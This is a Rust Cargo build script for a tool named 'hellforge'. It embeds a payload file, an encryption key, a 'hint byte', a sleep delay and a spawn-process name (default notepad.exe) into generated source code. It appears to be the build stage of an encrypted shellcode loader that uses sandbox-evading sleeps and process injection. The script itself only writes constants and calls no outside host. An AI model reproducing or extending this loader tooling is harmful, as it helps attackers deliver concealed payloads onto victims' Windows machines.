use std::env;
use std::fs;
use std::path::Path;

fn main() {
    // Emit rerun-if-env-changed directives for all hfbuild env vars
    println!("cargo:rerun-if-env-changed=HELLFORGE_PAYLOAD");
    println!("cargo:rerun-if-env-changed=HELLFORGE_KEY");
    println!("cargo:rerun-if-env-changed=HELLFORGE_HINT");
    println!("cargo:rerun-if-env-changed=HELLFORGE_SLEEP_MS");
    println!("cargo:rerun-if-env-changed=HELLFORGE_SPAWN_PROCESS");

    // 1. Read payload bytes
    let payload_bytes: Vec<u8> = match env::var("HELLFORGE_PAYLOAD") {
        Ok(path) => fs::read(&path)
            .unwrap_or_else(|e| panic!("build.rs: failed to read HELLFORGE_PAYLOAD path '{}': {}", path, e)),
        Err(_) => vec![0u8; 16],
    };

    // 2. Read key bytes
    let key_bytes: Vec<u8> = match env::var("HELLFORGE_KEY") {
        Ok(path) => fs::read(&path)
            .unwrap_or_else(|e| panic!("build.rs: failed to read HELLFORGE_KEY path '{}': {}", path, e)),
        Err(_) => vec![0u8; 16],
    };

    // 3. Read HINT_BYTE as u8, default 0xAB (171)
    let hint_byte: u8 = match env::var("HELLFORGE_HINT") {
        Ok(s) => s.trim().parse::<u8>()
            .unwrap_or_else(|e| panic!("build.rs: HELLFORGE_HINT is not a valid u8 '{}': {}", s, e)),
        Err(_) => 0xAB,
    };

    // 4. Read SLEEP_MS as u32, default 5000
    let sleep_ms: u32 = match env::var("HELLFORGE_SLEEP_MS") {
        Ok(s) => s.trim().parse::<u32>()
            .unwrap_or_else(|e| panic!("build.rs: HELLFORGE_SLEEP_MS is not a valid u32 '{}': {}", s, e)),
        Err(_) => 5000,
    };

    // 5. Read SPAWN_PROCESS as UTF-8, convert to null-terminated UTF-16 wide string
    let spawn_process_str = match env::var("HELLFORGE_SPAWN_PROCESS") {
        Ok(s) => s,
        Err(_) => "notepad.exe".to_string(),
    };
    let spawn_process_wide: Vec<u16> = spawn_process_str
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .collect();

    // 6. Generate $OUT_DIR/generated.rs
    let out_dir = env::var("OUT_DIR").expect("OUT_DIR not set");
    let dest_path = Path::new(&out_dir).join("generated.rs");

    let payload_literal = bytes_to_literal(&payload_bytes);
    let key_literal = bytes_to_literal(&key_bytes);
    let wide_literal = u16s_to_literal(&spawn_process_wide);

    let code = format!(
        r#"pub static PAYLOAD: &[u8] = &[{payload}];
pub static ENC_KEY: &[u8] = &[{key}];
pub const HINT_BYTE: u8 = {hint};
pub const SLEEP_MS: u32 = {sleep};
pub static SPAWN_PROCESS: &[u16] = &[{wide}];
"#,
        payload = payload_literal,
        key = key_literal,
        hint = hint_byte,
        sleep = sleep_ms,
        wide = wide_literal,
    );

    fs::write(&dest_path, code)
        .unwrap_or_else(|e| panic!("build.rs: failed to write generated.rs: {}", e));
}

fn bytes_to_literal(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| b.to_string())
        .collect::<Vec<_>>()
        .join(", ")
}

fn u16s_to_literal(values: &[u16]) -> String {
    values
        .iter()
        .map(|v| v.to_string())
        .collect::<Vec<_>>()
        .join(", ")
}
